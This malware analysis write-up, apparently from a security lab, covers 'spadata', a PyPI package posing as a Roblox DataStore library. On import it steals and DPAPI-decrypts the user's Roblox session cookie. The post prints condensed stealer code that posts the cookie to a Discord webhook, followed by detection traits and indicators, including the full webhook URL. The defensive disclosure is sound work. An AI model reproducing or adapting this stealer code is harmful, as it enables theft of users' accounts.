---
title: "spadata: Gimme all your Roblox — the PyPI DataStore lib that isn't"
date: 2026-06-03
summary: "`spadata@0.1.1` is a PyPI package that sells itself as a Python library for managing your Roblox DataStore data — and does none of that. It carries no storage code, no API calls, nothing it advertises; the only thing inside is a credential stealer in `__init__.py` that auto-runs on `import spadata`, before the victim calls anything. It copies Roblox's local cookie store `robloxcookies.dat`, base64-decodes the `CookiesData` field, and calls `win32crypt.CryptUnprotectData` to DPAPI-decrypt it itself — so the cleartext `.ROBLOSECURITY` session leaves the host, not ciphertext — then posts it to a hardcoded Discord webhook. No persistence, no second stage, no obfuscation beyond a try/except: a low-effort, Russian-commented Roblox account stealer that does nothing but take the cookie."
packageName: spadata
ecosystem: PyPI
---

<img src="/assets/images/spadata-roblox-stickup-meme.jpg" alt="Meme: a kitten with its paws up at gunpoint — 'GIMME ALL YOUR ROBLOX PLZ.' spadata mugs the victim for exactly one thing: their Roblox session cookie." style="width: 60%; height: auto;">

Most PyPI stealers ship a tool that at least half-works as a disguise. `spadata` doesn't bother: it sells itself as a Python library for managing your Roblox DataStore data and delivers none of it — no storage code, no API calls, nothing it advertises. What's actually inside runs the moment you `import spadata`, and all it does is steal the local Roblox session cookie and post it to a Discord webhook. The README can't even keep the name straight, calling the package «spaysdata» in its own description. The meme is the spec: walk up to a Roblox player and ask for everything. And it makes you pull the trigger — nobody runs anything, the import is the stickup.

Traits below are from cleave `2.0.0-rc.4` (traits `126f8e4b2`); the wheel was unpacked and read statically, nothing was imported.

## Package metadata

| Field | Value |
| --- | --- |
| Name | `spadata` |
| Version | `0.1.1` |
| Summary | `Библиотека для работы с DataStore в Roblox` |
| Description | `Custom Python library for Roblox DataStore.` |
| Requires-Python | `>=3.8` |
| Requires-Dist | `requests`; `pywin32; sys_platform == "win32"` |
| Entry point | `spadata-run = spadata.main:retrieve_roblox_cookies` |
| Generator | `setuptools 82.0.1` |
| Tag | `py3-none-any` |

## One import, one cookie, one webhook

The wheel holds two files and no product. `__init__.py` calls the stealer at import time inside a bare try/except, so the theft fires the moment Python loads the package and any error dies silently. It copies Roblox's local cookie store `robloxcookies.dat` to the temp folder and reads the base64 cookie field inside. Roblox keeps that field DPAPI-encrypted, so the code calls `win32crypt.CryptUnprotectData` itself — the thief unlocks the loot before taking it. The cleartext `.ROBLOSECURITY` cookie then goes straight to a Discord webhook hardcoded in plaintext at the top of the file. That cookie is the whole account — replayed in a browser it walks past the password and 2FA, which for a Roblox player is the Robux, the inventory, and the resale value in one string. It even captions the theft, firing a `Decrypted Content:` label just before the cookie.

<pre class="lang-js"><code><span class="tok-com"># __init__.py — import is the trigger</span>
<span class="tok-kw">from</span> .main <span class="tok-kw">import</span> retrieve_roblox_cookies
<span class="tok-kw">try</span>: <span class="tok-fn">retrieve_roblox_cookies</span>()            <span class="tok-com"># «выполнится АВТОМАТИЧЕСКИ» — runs on import</span>
<span class="tok-kw">except</span> Exception <span class="tok-kw">as</span> e: <span class="tok-fn">print</span>(e)

<span class="tok-com"># main.py — copy, decrypt, post (condensed)</span>
webhook = <span class="tok-str">"https://discord.com/api/webhooks/1501511921185325186/0-lN4d-…"</span>
shutil.<span class="tok-fn">copy</span>(roblox_cookies_path, dst)         <span class="tok-com"># %USERPROFILE%\...\LocalStorage\robloxcookies.dat</span>
encoded = json.<span class="tok-fn">load</span>(<span class="tok-fn">open</span>(dst))[<span class="tok-str">"CookiesData"</span>]
clear = win32crypt.<span class="tok-fn">CryptUnprotectData</span>(base64.<span class="tok-fn">b64decode</span>(encoded), <span class="tok-kw">None</span>, <span class="tok-kw">None</span>, <span class="tok-kw">None</span>, <span class="tok-num">0</span>)[<span class="tok-num">1</span>]
requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: <span class="tok-str">"Decrypted Content:"</span>})
requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: clear.<span class="tok-fn">decode</span>(<span class="tok-str">"utf-8"</span>, errors=<span class="tok-str">"ignore"</span>)})
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/platform` | Reads Roblox's local cookie store `robloxcookies.dat` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/dpapi` | DPAPI-decrypted secret posted to a Discord webhook |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/channel/messaging` | Hardcoded `discord.com/api/webhooks/...` URL |
| <span class="sev-dot notable" title="notable"></span> | `objectives/credential-access/browser/dpapi` | `win32crypt.CryptUnprotectData` on the decoded blob |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/data/control-flow/module-exec` | Import-time call silenced by try/except |
| <span class="sev-dot notable" title="notable"></span> | `objectives/anti-static/obfuscation/code-metrics/source` | Russian comments trip the non-ASCII ratio |

## A stickup, not a heist

Strip the costume and there's almost nothing here: no persistence, no second stage, no obfuscation past a try/except, and a webhook anyone can report and burn. The point was never craft — it's that a package selling itself as Roblox data management ships zero data code and one cookie grab. It works because the mark came for a shortcut and was never going to open `__init__.py`. The cat in the meme has its paws up; the gun is a `pip install`.

## Indicators

| Type | Value |
| --- | --- |
| Wheel | `spadata-0.1.1-py3-none-any.whl` |
| Wheel SHA-256 | [`d6bd7475105b0c2b561870a1c1f1b16bdbe811867340a1ebbc995db8f7fc2bff`](https://lab.atomdrift.org/file/d6bd7475105b0c2b561870a1c1f1b16bdbe811867340a1ebbc995db8f7fc2bff) |
| `main.py` SHA-256 | [`cafc8dc7fb047e6a59826974a0921f5c45022bb77a85af8502e1a5105eb3a1c8`](https://lab.atomdrift.org/file/cafc8dc7fb047e6a59826974a0921f5c45022bb77a85af8502e1a5105eb3a1c8) |
| `__init__.py` SHA-256 | [`44788ac7ba1cb54093f6edf2382da25047564417ef4223ff94c110116c83c90c`](https://lab.atomdrift.org/file/44788ac7ba1cb54093f6edf2382da25047564417ef4223ff94c110116c83c90c) |
| Discord webhook | `https://discord.com/api/webhooks/1501511921185325186/0-lN4d-dYtJXAI0Wzf_ay225eK_DzM3Prp8-uTh4CVVt-1gDPJHG0SEZL7Pe9GCAQcOT` |
| Cookie file read | `%USERPROFILE%\AppData\Local\Roblox\LocalStorage\robloxcookies.dat` |
</content>
